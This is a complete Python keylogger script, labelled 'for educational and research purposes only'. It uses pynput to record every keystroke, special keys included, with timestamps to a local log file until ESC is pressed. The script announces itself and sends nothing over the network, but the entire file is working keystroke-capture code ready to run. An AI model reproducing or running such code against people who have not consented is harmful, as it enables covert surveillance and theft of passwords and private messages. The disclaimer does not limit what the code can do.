"""
Keylogger-Project
-----------------
For educational and research purposes only.
The author is not liable for any misuse of this script.
Only run this on machines you own or have explicit permission to test on.
"""

from pynput import keyboard
import os
import datetime

LOG_FILE = "log.txt"


def get_timestamp():
    return datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")


def write_to_log(data):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(data)


def on_press(key):
    try:
        # Regular character key
        write_to_log(key.char)
    except AttributeError:
        # Special key (shift, enter, backspace, etc.)
        special = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: f"\n{get_timestamp()} ",
            keyboard.Key.tab: "\t",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.delete: "[DELETE]",
            keyboard.Key.caps_lock: "[CAPS LOCK]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.ctrl_l: "[CTRL]",
            keyboard.Key.ctrl_r: "[CTRL]",
            keyboard.Key.alt_l: "[ALT]",
            keyboard.Key.alt_r: "[ALT]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.up: "[UP]",
            keyboard.Key.down: "[DOWN]",
            keyboard.Key.left: "[LEFT]",
            keyboard.Key.right: "[RIGHT]",
        }
        write_to_log(special.get(key, f"[{key}]"))


def on_release(key):
    # Stop the listener if ESC is held — useful during testing
    if key == keyboard.Key.esc:
        return False


def start():
    # Write a session header to the log
    write_to_log(f"\n\n--- Session started: {get_timestamp()} ---\n")
    print("Keylogger running. Press ESC to stop.")
    print(f"Logging keystrokes to: {os.path.abspath(LOG_FILE)}")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    write_to_log(f"\n--- Session ended: {get_timestamp()} ---\n")
    print("Keylogger stopped.")


if __name__ == "__main__":
    start()
